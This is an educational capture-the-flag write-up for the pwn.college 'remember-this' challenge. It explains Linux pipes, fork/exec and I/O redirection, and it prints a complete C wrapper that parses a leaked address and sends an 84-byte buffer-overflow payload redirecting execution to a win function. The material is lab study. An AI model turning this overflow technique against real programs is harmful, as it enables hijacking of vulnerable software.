@@ -1,0 +1,2559 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+
+<html>
+
+<head>
+
+<title>[004] PWN - Remember This: Pipes, Leaks and Buffer Overflow</title>
+
+<style>
+
+body{
+
+    background:#1A1A1A;
+
+    color:#F8F6F2;
+
+    font-family:Verdana, Arial, Helvetica, sans-serif;
+
+    font-size:18px;
+
+    line-height:1.8;
+
+    width:900px;
+
+    margin:40px auto;
+
+}
+
+h1,h2,h3,h4{
+
+    color:#FFFFFF;
+
+}
+
+p{
+
+    color:#F8F6F2;
+
+}
+
+a{
+
+    color:#8AB4F8;
+
+    text-decoration:none;
+
+}
+
+a:hover{
+
+    text-decoration:underline;
+
+}
+
+hr{
+
+    border:0;
+
+    border-top:1px solid #444444;
+
+}
+
+table{
+
+    width:100%;
+
+    border-collapse:collapse;
+
+    margin:20px 0;
+
+}
+
+th{
+
+    background:#2A2A2A;
+
+    color:#FFFFFF;
+
+}
+
+th,td{
+
+    border:1px solid #444444;
+
+    padding:10px;
+
+}
+
+pre{
+
+    background:#2A2A2A;
+
+    color:#F8F6F2;
+
+    border:1px solid #444444;
+
+    padding:15px;
+
+    overflow:auto;
+
+}
+
+ul{
+
+    line-height:2;
+
+}
+
+img{
+
+    max-width:100%;
+
+}
+
+blockquote{
+
+    border-left:4px solid #666666;
+
+    padding-left:15px;
+
+    color:#D8D4CC;
+
+    font-style:italic;
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<center>
+
+<h1>[004] PWN - Remember This: Pipes, Leaks and Buffer Overflow</h1>
+
+<p>
+<b>Brijesh Babu K</b>
+<br>
+Independent Security Research
+<br><br>
+Published: September 2026
+</p>
+
+</center>
+
+<hr>
+
+<h2>Introduction</h2>
+
+<p>
+This write-up documents my solution to the
+<b>remember-this</b> challenge from pwn.college.
+</p>
+
+<p>
+This write-up documents my solution to the remember-this challenge from pwn.college.
+
+The main problem was that the challenge program prints a runtime leaked address and then waits for input. The payload I needed to send had to contain this leaked address in binary form, so manually copying and converting the address was not the approach I wanted.
+</p>
+
+<p>
+To solve this, I wrote a C parent program that automatically controls the challenge program. The parent creates two Linux pipes and uses fork() and execvp() to start the challenge as a child process. One pipe captures the challenge's stdout, while the second pipe sends the final payload back to the challenge's stdin.
+</p>
+
+<p>
+The parent first reads the challenge output, extracts the leaked address using strtoul(), and converts the hexadecimal string into an integer. It then constructs an 84-byte payload containing 80 A bytes followed by the 4-byte leaked address. Finally, it sends those raw bytes through the second pipe to the challenge.
+
+I could have written a Python script to automate the same interaction, but I chose C because the main purpose of this exercise was to understand the Linux process and system-programming side of the problem. By implementing it in C, I had to directly work with pipe(), fork(), dup2(), execvp(), read(), write(), and wait(). This helped me understand how processes communicate through file descriptors, how standard input/output can be redirected, and how a parent process can control and exchange data with a child process.
+</p>
+
+<pre>
+                 Parent / Wrapper
+                       |
+                       |
+                     fork()
+                       |
+              +--------+--------+
+              |                 |
+            Parent            Child
+              |                 |
+              |              exec()
+              |                 |
+              |       /challenge/remember-this
+              |                 |
+              |&lt;----- stdout ---|
+              |
+        read leaked address
+              |
+        parse the address
+              |
+        construct payload
+              |
+              |------ stdin -----&gt;
+              |
+           challenge
+</pre>
+
+<p>
+This turned the challenge into a complete automated process:
+</p>
+
+<pre>
+leak
+  |
+  v
+read()
+  |
+  v
+parse
+  |
+  v
+strtoul()
+  |
+  v
+calculate / obtain address
+  |
+  v
+construct 84-byte buffer
+  |
+  v
+write()
+  |
+  v
+challenge stdin
+  |
+  v
+buffer overflow
+  |
+  v
+target function
+</pre>
+
+<hr>
+
+<h2>1. Understanding the Challenge</h2>
+
+<p>
+The challenge program is:
+</p>
+
+<pre>
+/challenge/remember-this
+</pre>
+
+<p>
+The basic behavior of the challenge can be represented as:
+</p>
+
+<pre>
+start
+  |
+  v
+print leaked address
+  |
+  v
+wait for input
+  |
+  v
+process input
+  |
+  v
+continue execution
+</pre>
+
+<p>
+The important output looks similar to:
+</p>
+
+<pre>
+[LEAK] win: 0x6298930d
+</pre>
+
+<p>
+The interesting part is the hexadecimal address:
+</p>
+
+<pre>
+0x6298930d
+</pre>
+
+<p>
+Because this is a 32-bit challenge, the address occupies:
+</p>
+
+<pre>
+32 bits
+   |
+   v
+4 bytes
+</pre>
+
+<p>
+The payload expected by the vulnerable program has the following
+general structure:
+</p>
+
+<pre>
+80 bytes of padding
+        +
+4-byte target address
+        =
+84 bytes
+</pre>
+
+<p>
+The purpose of my wrapper is to obtain the target address dynamically
+and construct this input automatically.
+</p>
+
+<hr>
+
+<h2>2. Why Create a Wrapper Program?</h2>
+
+<p>
+The simplest way to interact with the challenge would be to run the
+program manually, read the leaked address, construct the input, and
+provide it through stdin.
+</p>
+
+<p>
+However, I wanted to automate the entire process.
+</p>
+
+<p>
+The wrapper therefore needs to perform several operations:
+</p>
+
+<ul>
+
+<li>Start the challenge program.</li>
+
+<li>Capture the challenge's stdout.</li>
+
+<li>Store the output in a buffer.</li>
+
+<li>Extract the leaked address.</li>
+
+<li>Convert the address from a string into a numeric value.</li>
+
+<li>Construct the binary payload.</li>
+
+<li>Send the payload to the challenge's stdin.</li>
+
+<li>Read the final output from the challenge.</li>
+
+</ul>
+
+<p>
+The complete communication model is:
+</p>
+
+<pre>
+challenge stdout
+       |
+       v
+      pipe
+       |
+       v
+    parent
+       |
+       | parse leak
+       |
+       | construct payload
+       v
+      pipe
+       |
+       v
+challenge stdin
+</pre>
+
+<p>
+Since communication is required in both directions, I use two pipes.
+</p>
+
+<hr>
+
+<h2>3. Creating the Pipes</h2>
+
+<p>
+The first part of the program creates two pipe arrays:
+</p>
+
+<pre>
+int fd[2];
+int dd[2];
+</pre>
+
+<p>
+Then:
+</p>
+
+<pre>
+if(pipe(fd) == -1)
+{
+    perror("pipe error");
+    return 1;
+}
+
+if(pipe(dd) == -1)
+{
+    perror("pipe2 is error");
+    return 1;
+}
+</pre>
+
+<p>
+The important rule for a Linux pipe is:
+</p>
+
+<pre>
+pipe[0] = read end
+pipe[1] = write end
+</pre>
+
+<p>
+Therefore:
+</p>
+
+<pre>
+fd[0] = read end of pipe 1
+fd[1] = write end of pipe 1
+
+dd[0] = read end of pipe 2
+dd[1] = write end of pipe 2
+</pre>
+
+<p>
+I use the first pipe for:
+</p>
+
+<pre>
+challenge stdout
+      |
+      v
+     fd[1]
+      |
+     pipe
+      |
+      v
+     fd[0]
+      |
+      v
+    parent
+</pre>
+
+<p>
+The second pipe is used for:
+</p>
+
+<pre>
+parent
+   |
+   v
+ dd[1]
+   |
+  pipe
+   |
+   v
+ dd[0]
+   |
+   v
+challenge stdin
+</pre>
+
+<p>
+So the direction of communication is:
+</p>
+
+<pre>
+PIPE 1:
+
+challenge  ----&gt;  parent
+
+
+PIPE 2:
+
+parent  ----&gt;  challenge
+</pre>
+
+<hr>
+
+<h2>4. Creating the Parent and Child</h2>
+
+<p>
+After creating the pipes, I use:
+</p>
+
+<pre>
+pid_t pid = fork();
+</pre>
+
+<p>
+The fork creates a second process.
+</p>
+
+<pre>
+                  fork()
+                    |
+          +---------+---------+
+          |                   |
+        child               parent
+</pre>
+
+<p>
+The child will become the challenge program.
+</p>
+
+<p>
+The parent will control the communication.
+</p>
+
+<p>
+The return value of <b>fork()</b> tells us which process we are in.
+</p>
+
+<pre>
+pid == 0
+    |
+    v
+child process
+
+
+pid &gt; 0
+    |
+    v
+parent process
+
+
+pid &lt; 0
+    |
+    v
+fork failed
+</pre>
+
+<hr>
+
+<h2>5. Child Process</h2>
+
+<p>
+The child process enters:
+</p>
+
+<pre>
+if(pid == 0)
+{
+    ...
+}
+</pre>
+
+<p>
+The first thing I need to do is configure the child's standard output
+and standard input.
+</p>
+
+<p>
+The reason is that I do not want the challenge's stdout to directly
+go to my terminal. I want the parent process to receive it.
+</p>
+
+<hr>
+
+<h2>6. Redirecting stdout</h2>
+
+<p>
+The child first closes:
+</p>
+
+<pre>
+close(fd[0]);
+</pre>
+
+<p>
+The child does not need the read side of the first pipe.
+</p>
+
+<p>
+The child needs to write its stdout into the pipe.
+</p>
+
+<p>
+This is done using:
+</p>
+
+<pre>
+dup2(fd[1], STDOUT_FILENO);
+</pre>
+
+<p>
+On Linux:
+</p>
+
+<pre>
+STDOUT_FILENO = 1
+</pre>
+
+<p>
+Normally, when a program executes:
+</p>
+
+<pre>
+printf("hello");
+</pre>
+
+<p>
+the data goes through file descriptor 1:
+</p>
+
+<pre>
+printf()
+   |
+   v
+STDOUT_FILENO
+   |
+   v
+terminal
+</pre>
+
+<p>
+After:
+</p>
+
+<pre>
+dup2(fd[1], STDOUT_FILENO);
+</pre>
+
+<p>
+the path becomes:
+</p>
+
+<pre>
+printf()
+   |
+   v
+STDOUT_FILENO
+   |
+   v
+fd[1]
+   |
+   v
+pipe
+   |
+   v
+fd[0]
+   |
+   v
+parent
+</pre>
+
+<p>
+This means the challenge's stdout has been redirected into the pipe.
+</p>
+
+<p>
+After the redirection:
+</p>
+
+<pre>
+close(fd[1]);
+</pre>
+
+<p>
+is performed because stdout already refers to the pipe.
+</p>
+
+<hr>
+
+<h2>7. Redirecting stdin</h2>
+
+<p>
+The second pipe is used in the opposite direction.
+</p>
+
+<p>
+The child closes the write side:
+</p>
+
+<pre>
+close(dd[1]);
+</pre>
+
+<p>
+Then:
+</p>
+
+<pre>
+dup2(dd[0], STDIN_FILENO);
+</pre>
+
+<p>
+On Linux:
+</p>
+
+<pre>
+STDIN_FILENO = 0
+</pre>
+
+<p>
+Normally:
+</p>
+
+<pre>
+challenge
+    |
+    v
+STDIN_FILENO
+    |
+    v
+keyboard / terminal
+</pre>
+
+<p>
+After the redirection:
+</p>
+
+<pre>
+parent
+   |
+   v
+dd[1]
+   |
+  pipe
+   |
+   v
+dd[0]
+   |
+   v
+STDIN_FILENO
+   |
+   v
+challenge
+</pre>
+
+<p>
+Therefore, whenever the challenge reads from stdin, the data can come
+from the parent process.
+</p>
+
+<p>
+The child then closes:
+</p>
+
+<pre>
+close(dd[0]);
+</pre>
+
+<p>
+because stdin already refers to that pipe.
+</p>
+
+<hr>
+
+<h2>8. Executing the Challenge</h2>
+
+<p>
+After configuring stdin and stdout, the child executes the challenge.
+</p>
+
+<p>
+My code uses:
+</p>
+
+<pre>
+char *const argv[] = {
+    "stdbuf",
+    "-o0",
+    "/challenge/remember-this",
+    NULL
+};
+
+execvp("stdbuf", argv);
+</pre>
+
+<p>
+This effectively executes:
+</p>
+
+<pre>
+stdbuf -o0 /challenge/remember-this
+</pre>
+
+<p>
+The <b>-o0</b> option requests unbuffered stdout.
+</p>
+
+<p>
+This is useful because the parent needs to receive the challenge's
+output while the challenge is still running.
+</p>
+
+<p>
+The final child process therefore looks like:
+</p>
+
+<pre>
+child
+  |
+  v
+stdbuf
+  |
+  v
+/challenge/remember-this
+</pre>
+
+<p>
+The important point is that the stdin and stdout redirections created
+before <b>execvp()</b> remain available to the executed program.
+</p>
+
+<hr>
+
+<h2>9. Parent Process Setup</h2>
+
+<p>
+The parent enters:
+</p>
+
+<pre>
+else if(pid &gt; 0)
+{
+    ...
+}
+</pre>
+
+<p>
+The parent does not need the unused pipe ends.
+</p>
+
+<pre>
+close(dd[0]);
+close(fd[1]);
+</pre>
+
+<p>
+The parent now has:
+</p>
+
+<pre>
+fd[0]
+  |
+  +-- read challenge stdout
+
+
+dd[1]
+  |
+  +-- write challenge stdin
+</pre>
+
+<p>
+So the parent communication model is:
+</p>
+
+<pre>
+                 PARENT
+                /      \
+               /        \
+            fd[0]       dd[1]
+             |            |
+            read         write
+             |            |
+             v            v
+        challenge     challenge
+          stdout          stdin
+</pre>
+
+<hr>
+
+<h2>10. Reading the Leaked Output</h2>
+
+<p>
+The parent creates:
+</p>
+
+<pre>
+char buffer[100];
+</pre>
+
+<p>
+Then reads from the first pipe:
+</p>
+
+<pre>
+ssize_t n = read(
+    fd[0],
+    buffer,
+    sizeof(buffer) - 1
+);
+</pre>
+
+<p>
+Since:
+</p>
+
+<pre>
+sizeof(buffer) = 100
+</pre>
+
+<p>
+the requested read size is:
+</p>
+
+<pre>
+100 - 1 = 99 bytes
+</pre>
+
+<p>
+After reading, I manually add a null terminator:
+</p>
+
+<pre>
+buffer[n] = '\0';
+</pre>
+
+<p>
+This is important because <b>read()</b> does not automatically append
+a null byte.
+</p>
+
+<p>
+The data flow is:
+</p>
+
+<pre>
+challenge
+    |
+    | stdout
+    v
+fd[1]
+    |
+    v
+pipe
+    |
+    v
+fd[0]
+    |
+    v
+buffer
+</pre>
+
+<hr>
+
+<h2>11. The Leaked Address</h2>
+
+<p>
+The challenge produces output similar to:
+</p>
+
+<pre>
+[LEAK] win: 0x6298930d
+</pre>
+
+<p>
+The prefix:
+</p>
+
+<pre>
+[LEAK] win:
+</pre>
+
+<p>
+contains 12 bytes when the trailing space is included.
+</p>
+
+<p>
+Therefore I use:
+</p>
+
+<pre>
+int offset = 12;
+</pre>
+
+<p>
+Conceptually:
+</p>
+
+<pre>
+[LEAK] win: 0x6298930d
+&lt;---12--&gt; &lt;--------&gt;
+ prefix      address
+</pre>
+
+<p>
+The purpose of the offset is to separate the textual prefix from the
+actual leaked address.
+</p>
+
+<hr>
+
+<h2>12. Extracting the Prefix</h2>
+
+<p>
+I copy the first 12 bytes into another buffer:
+</p>
+
+<pre>
+memcpy(offset_buf, buffer, offset);
+</pre>
+
+<p>
+Then I terminate it:
+</p>
+
+<pre>
+offset_buf[offset] = '\0';
+</pre>
+
+<p>
+The result is:
+</p>
+
+<pre>
+offset_buf
+
+"[LEAK] win: "
+</pre>
+
+<p>
+There is an important C detail here.
+</p>
+
+<p>
+Because I copy 12 bytes and also need one byte for the terminating
+<b>\0</b>, the buffer should have room for at least 13 bytes:
+</p>
+
+<pre>
+char offset_buf[13];
+</pre>
+
+<p>
+A smaller declaration such as:
+</p>
+
+<pre>
+char offset_buf[11];
+</pre>
+
+<p>
+would not have enough space for this operation.
+</p>
+
+<hr>
+
+<h2>13. Extracting the Address</h2>
+
+<p>
+Next I calculate how many bytes remain after the prefix:
+</p>
+
+<pre>
+int remaining = n - offset;
+</pre>
+
+<p>
+Then:
+</p>
+
+<pre>
+memcpy(
+    remaining_buf,
+    buffer + offset,
+    remaining
+);
+</pre>
+
+<p>
+The pointer:
+</p>
+
+<pre>
+buffer + offset
+</pre>
+
+<p>
+means:
+</p>
+
+<pre>
+start at buffer
+      |
+      +---- move forward 12 bytes
+</pre>
+
+<p>
+So the data after the prefix is copied into <b>remaining_buf</b>.
+</p>
+
+<p>
+Finally:
+</p>
+
+<pre>
+remaining_buf[remaining] = '\0';
+</pre>
+
+<p>
+The resulting string is:
+</p>
+
+<pre>
+0x6298930d
+</pre>
+
+<p>
+At this point the address is still text.
+</p>
+
+<hr>
+
+<h2>14. Converting the Address with strtoul()</h2>
+
+<p>
+The leaked address needs to become a numeric value.
+</p>
+
+<p>
+I use:
+</p>
+
+<pre>
+unsigned int addr =
+    (unsigned int)strtoul(
+        remaining_buf,
+        NULL,
+        0
+    );
+</pre>
+
+<p>
+Suppose:
+</p>
+
+<pre>
+remaining_buf = "0x6298930d"
+</pre>
+
+<p>
+Then <b>strtoul()</b> converts the string into a numeric value:
+</p>
+
+<pre>
+"0x6298930d"
+      |
+      v
+   strtoul()
+      |
+      v
+0x6298930d
+</pre>
+
+<p>
+The last argument is:
+</p>
+
+<pre>
+0
+</pre>
+
+<p>
+Using base 0 tells <b>strtoul()</b> to determine the base from the
+string prefix.
+</p>
+
+<p>
+For example:
+</p>
+
+<pre>
+1234       - decimal
+
+0x1234     - hexadecimal
+
+01234      - octal
+</pre>
+
+<p>
+Therefore the hexadecimal leak can be converted without manually
+specifying base 16.
+</p>
+
+<hr>
+
+<h2>15. Understanding the 32-bit Address</h2>
+
+<p>
+The challenge uses a 32-bit address.
+</p>
+
+<pre>
+32 bits
+  |
+  v
+4 bytes
+</pre>
+
+<p>
+For example:
+</p>
+
+<pre>
+0x6298930d
+</pre>
+
+<p>
+can be separated into:
+</p>
+
+<pre>
+62 98 93 0d
+</pre>
+
+<p>
+That is four bytes.
+</p>
+
+<p>
+However, the machine uses little-endian byte order.
+</p>
+
+<p>
+Therefore, the memory representation is:
+</p>
+
+<pre>
+0d 93 98 62
+</pre>
+
+<p>
+This matters because the payload contains the raw address bytes rather
+than the ASCII characters:
+</p>
+
+<pre>
+"0x6298930d"
+</pre>
+
+<hr>
+
+<h2>16. Constructing the Payload</h2>
+
+<p>
+The next step is to create the input that will be sent to the
+challenge.
+</p>
+
+<p>
+I allocate:
+</p>
+
+<pre>
+unsigned char test_buf[84];
+</pre>
+
+<p>
+The layout is:
+</p>
+
+<pre>
+test_buf
+
+0                                      79 80          83
+|---------------------------------------|--------------|
+|              80 x 'A'                | 4-byte addr  |
+|---------------------------------------|--------------|
+
+              80 bytes                    4 bytes
+
+                         80 + 4 = 84
+</pre>
+
+<p>
+The first 80 bytes are padding.
+</p>
+
+<p>
+The final 4 bytes contain the target address.
+</p>
+
+<hr>
+
+<h2>17. Filling the Padding with memset()</h2>
+
+<p>
+I use:
+</p>
+
+<pre>
+memset(test_buf, 'A', 80);
+</pre>
+
+<p>
+This writes the character <b>A</b> into the first 80 bytes.
+</p>
+
+<p>
+ASCII:
+</p>
+
+<pre>
+'A' = 0x41
+</pre>
+
+<p>
+Therefore the first part of the payload looks like:
+</p>
+
+<pre>
+41 41 41 41 41 41 41 41 ...
+</pre>
+
+<p>
+or, when viewed as text:
+</p>
+
+<pre>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</pre>
+
+<p>
+The important part is that there are exactly 80 bytes before the
+address.
+</p>
+
+<hr>
+
+<h2>18. Copying the Address into the Payload</h2>
+
+<p>
+After creating the padding, I place the address at byte offset 80:
+</p>
+
+<pre>
+memcpy(test_buf + 80, &amp;addr, 4);
+</pre>
+
+<p>
+The expression:
+</p>
+
+<pre>
+test_buf + 80
+</pre>
+
+<p>
+points to the 81st byte of the array, because array indexing starts
+from zero.
+</p>
+
+<p>
+The final layout is:
+</p>
+
+<pre>
+offset
+
+0                                      79 80          83
+|---------------------------------------|--------------|
+|             'A' x 80                  | address      |
+|---------------------------------------|--------------|
+</pre>
+
+<p>
+This creates an 84-byte binary payload.
+</p>
+
+<hr>
+
+<h2>19. Inspecting the Payload</h2>
+
+<p>
+To debug the payload, I print each byte in hexadecimal:
+</p>
+
+<pre>
+for(int i = 0; i &lt; 84; i++)
+    printf("%02x", test_buf[i]);
+
+printf("\n");
+</pre>
+
+<p>
+This is useful because the payload contains raw binary data.
+</p>
+
+<p>
+For example:
+</p>
+
+<pre>
+414141414141414141414141...
+</pre>
+
+<p>
+represents:
+</p>
+
+<pre>
+41 41 41 41 41 41 ...
+</pre>
+
+<p>
+and:
+</p>
+
+<pre>
+41
+</pre>
+
+<p>
+is the ASCII representation of:
+</p>
+
+<pre>
+'A'
+</pre>
+
+<p>
+Printing the buffer as hexadecimal makes it easier to verify the exact
+number and position of bytes.
+</p>
+
+<hr>
+
+<h2>20. Sending the Payload</h2>
+
+<p>
+Once the payload is constructed, I send it through the second pipe:
+</p>
+
+<pre>
+write(dd[1], test_buf, sizeof(test_buf));
+</pre>
+
+<p>
+Because:
+</p>
+
+<pre>
+sizeof(test_buf) = 84
+</pre>
+
+<p>
+the intended payload size is:
+</p>
+
+<pre>
+84 bytes
+</pre>
+
+<p>
+The complete data flow is:
+</p>
+
+<pre>
+test_buf
+   |
+   v
+write(dd[1], test_buf, 84)
+   |
+   v
+dd[1]
+   |
+   v
+pipe
+   |
+   v
+dd[0]
+   |
+   v
+STDIN_FILENO
+   |
+   v
+challenge
+</pre>
+
+<p>
+One important thing I learned here is that <b>write()</b> does not mean
+"print this to my terminal".
+</p>
+
+<p>
+It writes bytes to the file descriptor supplied to it.
+</p>
+
+<p>
+Because <b>dd[1]</b> represents the pipe connected to the challenge's
+stdin, the bytes go to the challenge.
+</p>
+
+<hr>
+
+<h2>21. Closing the Input Pipe</h2>
+
+<p>
+After sending the payload, I close:
+</p>
+
+<pre>
+close(dd[1]);
+</pre>
+
+<p>
+The correct order is:
+</p>
+
+<pre>
+write()
+  |
+  v
+close()
+</pre>
+
+<p>
+not:
+</p>
+
+<pre>
+close()
+  |
+  v
+write()
+</pre>
+
+<p>
+Closing the write side after the payload has been sent also allows the
+child to observe EOF if it performs a read that waits for the end of
+input.
+</p>
+
+<hr>
+
+<h2>22. The Deadlock Problem</h2>
+
+<p>
+One of the most important problems I encountered was a pipe deadlock.
+</p>
+
+<p>
+My first thought was to continuously read from the challenge:
+</p>
+
+<pre>
+while((n = read(fd[0], buffer, sizeof(buffer))) &gt; 0)
+{
+    ...
+}
+</pre>
+
+<p>
+But the challenge does not necessarily close stdout after printing the
+leak.
+</p>
+
+<p>
+Instead, its behavior is approximately:
+</p>
+
+<pre>
+challenge
+    |
+    v
+print leak
+    |
+    v
+wait for stdin
+</pre>
+
+<p>
+At the same time, the parent can end up doing:
+</p>
+
+<pre>
+parent
+   |
+   v
+read stdout
+   |
+   v
+wait for more data
+</pre>
+
+<p>
+Now both processes can wait for each other:
+</p>
+
+<pre>
+Parent:
+"I am waiting for more stdout."
+
+        &lt;----------------&gt;
+
+Challenge:
+"I am waiting for stdin."
+</pre>
+
+<p>
+This is a deadlock.
+</p>
+
+<p>
+The important lesson was that a pipe is a synchronization mechanism as
+well as a communication mechanism.
+</p>
+
+<p>
+For this challenge, I needed to read the available output, process the
+leak, and send the required input instead of waiting indefinitely for
+stdout EOF.
+</p>
+
+<hr>
+
+<h2>23. Reading the Remaining Output</h2>
+
+<p>
+After sending the payload, the challenge can produce additional output.
+</p>
+
+<p>
+I read that output using:
+</p>
+
+<pre>
+char loosu[1000];
+ssize_t m;
+
+while((m = read(fd[0], loosu, sizeof(loosu) - 1)) &gt; 0)
+{
+    loosu[m] = '\0';
+    printf("%s", loosu);
+}
+</pre>
+
+<p>
+The purpose of this loop is to continue receiving output from the
+challenge after the payload has been sent.
+</p>
+
+<p>
+The communication path is:
+</p>
+
+<pre>
+challenge
+    |
+    | stdout
+    v
+fd[1]
+    |
+    v
+pipe
+    |
+    v
+fd[0]
+    |
+    v
+loosu
+    |
+    v
+printf()
+    |
+    v
+terminal
+</pre>
+
+<p>
+When <b>read()</b> returns zero, it means the pipe reached EOF.
+</p>
+
+<hr>
+
+<h2>24. Waiting for the Child</h2>
+
+<p>
+At the end of the parent process I use:
+</p>
+
+<pre>
+wait(NULL);
+</pre>
+
+<p>
+The parent waits for the child process to finish.
+</p>
+
+<p>
+The complete process lifecycle is:
+</p>
+
+<pre>
+fork()
+  |
+  +-------------------+
+  |                   |
+  v                   v
+child               parent
+  |                   |
+  |                   |
+dup2()              read()
+  |                   |
+  v                   v
+exec()             parse leak
+  |                   |
+  v                   v
+challenge          build payload
+  |                   |
+  |                   v
+  |                 write()
+  |                   |
+  +-------------------+
+          |
+          v
+      final output
+          |
+          v
+        wait()
+</pre>
+
+<hr>
+
+<h2>25. Complete Wrapper Source Code</h2>
+
+<p>
+The following is the wrapper program used for the challenge:
+</p>
+
+<pre>
+#include &lt;stdio.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main()
+{
+    int fd[2];
+    int dd[2];
+
+    char buffer[100];
+    char calculated_data[] = "brijeshzzzz";
+
+    if(pipe(fd) == -1)
+    {
+        perror("pipe error");
+        return 1;
+    }
+
+    if(pipe(dd) == -1)
+    {
+        perror("pipe2 is error");
+        return 1;
+    }
+
+    pid_t pid = fork();
+
+    if(pid == 0)
+    {
+        /* child process */
+
+        close(fd[0]);
+
+        dup2(fd[1], STDOUT_FILENO);
+        close(fd[1]);
+
+        close(dd[1]);
+
+        dup2(dd[0], STDIN_FILENO);
+        close(dd[0]);
+
+        char *const argv[] = {
+            "stdbuf",
+            "-o0",
+            "/challenge/remember-this",
+            NULL
+        };
+
+        execvp("stdbuf", argv);
+
+        perror("execvp");
+
+        return 0;
+    }
+
+    else if(pid &gt; 0)
+    {
+        /* parent process */
+
+        close(dd[0]);
+        close(fd[1]);
+
+        char buffer[100];
+        char offset_buf[13];
+        char remaining_buf[1000];
+
+        ssize_t n =
+            read(fd[0], buffer, sizeof(buffer) - 1);
+
+        if(n &gt; 0)
+        {
+            buffer[n] = '\0';
+
+            int offset = 12;
+
+            /*
+             * Extract the prefix.
+             */
+
+            memcpy(
+                offset_buf,
+                buffer,
+                offset
+            );
+
+            offset_buf[offset] = '\0';
+
+            /*
+             * Extract the leaked address.
+             */
+
+            int remaining = n - offset;
+
+            memcpy(
+                remaining_buf,
+                buffer + offset,
+                remaining
+            );
+
+            remaining_buf[remaining] = '\0';
+
+            printf(
+                "Offset part: %s\n",
+                offset_buf
+            );
+
+            printf(
+                "Remaining: %s\n",
+                remaining_buf
+            );
+
+            /*
+             * Convert the leaked hexadecimal
+             * string into an integer.
+             */
+
+            unsigned int addr =
+                (unsigned int)strtoul(
+                    remaining_buf,
+                    NULL,
+                    0
+                );
+
+            /*
+             * Build the payload.
+             */
+
+            unsigned char test_buf[84];
+
+            memset(
+                test_buf,
+                'A',
+                80
+            );
+
+            memcpy(
+                test_buf + 80,
+                &amp;addr,
+                4
+            );
+
+            /*
+             * Print the payload as hexadecimal.
+             */
+
+            for(int i = 0; i &lt; 84; i++)
+                printf(
+                    "%02x",
+                    test_buf[i]
+                );
+
+            printf("\n");
+
+            /*
+             * Send the complete payload
+             * to the challenge stdin.
+             */
+
+            write(
+                dd[1],
+                test_buf,
+                sizeof(test_buf)
+            );
+
+            close(dd[1]);
+
+            printf(
+                "[child PID %d] after the execution "
+                "of the challenge the stdout of the "
+                "challenge program will be read and "
+                "stored in the buffer and calculate "
+                "the offset of the stdin and only get "
+                "the leak address\n",
+                getpid()
+            );
+        }
+
+        /*
+         * Read the remaining challenge output.
+         */
+
+        char loosu[1000];
+        ssize_t m;
+
+        while(
+            (m = read(
+                fd[0],
+                loosu,
+                sizeof(loosu) - 1
+            )) &gt; 0
+        )
+        {
+            loosu[m] = '\0';
+            printf("%s", loosu);
+        }
+
+        if(n == 0)
+        {
+            printf(
+                "\n[child] Got EOF - "
+                "parent closed write end\n"
+            );
+        }
+
+        printf(
+            "printf the parent pid %d",
+            getpid()
+        );
+
+        printf("\nchild RIP\n");
+
+        close(fd[0]);
+
+        wait(NULL);
+    }
+
+    else
+    {
+        perror("fork RIP");
+        return 1;
+    }
+
+    return 0;
+}
+</pre>
+
+<hr>
+
+<h2>26. Complete Communication Flow</h2>
+
+<p>
+At this point the entire program can be represented as one complete
+pipeline.
+</p>
+
+<pre>
+                         fork()
+                           |
+                 +---------+---------+
+                 |                   |
+               child               parent
+                 |                   |
+          close(fd[0])        close(fd[1])
+                 |                   |
+          dup2(fd[1], 1)      close(dd[0])
+                 |                   |
+          close(fd[1])             read()
+                 |                   |
+          dup2(dd[0], 0)            v
+                 |             challenge output
+          close(dd[0])              |
+                 |                  v
+              exec()          [LEAK] win:
+                 |                  |
+                 v                  v
+        /challenge/          extract address
+        remember-this              |
+                 |                  v
+                 |              strtoul()
+                 |                  |
+                 |                  v
+                 |             numeric address
+                 |                  |
+                 |                  v
+                 |            test_buf[84]
+                 |                  |
+                 |          +-------+-------+
+                 |          |               |
+                 |       80 x 'A'       4-byte addr
+                 |          |               |
+                 |          +-------+-------+
+                 |                  |
+                 |                  v
+                 |              write()
+                 |                  |
+                 |                  v
+                 +-------------&gt; stdin
+                                    |
+                                    v
+                               challenge
+                                    |
+                                    v
+                              final output
+                                    |
+                                    v
+                                  wait()
+</pre>
+
+<hr>
+
+<h2>27. The Payload Layout</h2>
+
+<p>
+The final buffer is 84 bytes.
+</p>
+
+<pre>
+              test_buf[84]
+
++------------------------------------------------+
+|                                                |
+|                 80 x 'A'                       |
+|                                                |
++------------------------------------------------+
+|                                                |
+|              4-byte address                    |
+|                                                |
++------------------------------------------------+
+
+0                                             83
+|------------------|-----------------------------|
+     80 bytes               4 bytes
+</pre>
+
+<p>
+The important calculation is:
+</p>
+
+<pre>
+80 bytes padding
+       +
+4 bytes address
+       =
+84 bytes total
+</pre>
+
+<p>
+The address is placed exactly after the 80-byte padding.
+</p>
+
+<hr>
+
+<h2>28. What the Important Functions Are Doing</h2>
+
+<h3>pipe()</h3>
+
+<pre>
+pipe(fd);
+</pre>
+
+<p>
+Creates a unidirectional communication channel.
+</p>
+
+<pre>
+fd[0] = read
+fd[1] = write
+</pre>
+
+<h3>fork()</h3>
+
+<pre>
+fork();
+</pre>
+
+<p>
+Creates the child process.
+</p>
+
+<h3>dup2()</h3>
+
+<pre>
+dup2(fd[1], STDOUT_FILENO);
+</pre>
+
+<p>
+Redirects stdout to the pipe.
+</p>
+
+<h3>execvp()</h3>
+
+<pre>
+execvp("stdbuf", argv);
+</pre>
+
+<p>
+Replaces the child process with the challenge execution.
+</p>
+
+<h3>read()</h3>
+
+<pre>
+read(fd[0], buffer, size);
+</pre>
+
+<p>
+Reads raw bytes from the pipe.
+</p>
+
+<h3>strtoul()</h3>
+
+<pre>
+strtoul(remaining_buf, NULL, 0);
+</pre>
+
+<p>
+Converts the leaked hexadecimal string into a numeric value.
+</p>
+
+<h3>memset()</h3>
+
+<pre>
+memset(test_buf, 'A', 80);
+</pre>
+
+<p>
+Fills the first 80 bytes of the payload with <b>A</b>.
+</p>
+
+<h3>memcpy()</h3>
+
+<pre>
+memcpy(test_buf + 80, &amp;addr, 4);
+</pre>
+
+<p>
+Copies the four-byte address into the payload.
+</p>
+
